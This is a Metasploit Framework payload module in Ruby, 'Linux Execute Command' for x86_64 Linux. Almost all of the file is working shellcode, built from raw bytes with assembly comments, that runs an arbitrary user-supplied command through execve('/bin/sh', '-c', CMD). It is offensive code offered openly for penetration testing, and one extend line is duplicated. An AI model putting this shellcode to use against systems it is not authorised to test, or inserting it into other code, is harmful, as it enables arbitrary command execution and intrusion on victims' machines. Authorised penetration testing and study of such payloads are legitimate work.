##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler
  extend  Metasploit::Framework::Module::Ancestor::Handler
  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Execute Command',
      'Description'   => 'Execute an arbitrary command',
      'Author'        => 'ricky',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86_64))

    register_options(
      [
        OptString.new('CMD',  [ true,  "The command string to execute" ]),
      ], self.class)
  end

  def generate_stage
    cmd = (datastore['CMD'] || '') << "\x00"
    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\x6a\x3b"                     + # pushq  $0x3b
      "\x58"                         + # pop    %rax
      "\x99"                         + # cltd
      "\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
      "\x73\x68\x00"                 + #
      "\x53"                         + # push   %rbx
      "\x48\x89\xe7"                 + # mov    %rsp,%rdi
      "\x68\x2d\x63\x00\x00"         + # pushq  $0x632d
      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
      "\x52"                         + # push   %rdx
      call                           + # callq  2d <run>
      cmd                            + # .ascii "cmd\0"
      "\x56"                         + # push   %rsi
      "\x57"                         + # push   %rdi
      "\x48\x89\xe6"                 + # mov    %rsp,%rsi
      "\x0f\x05"                       # syscall
  end
end
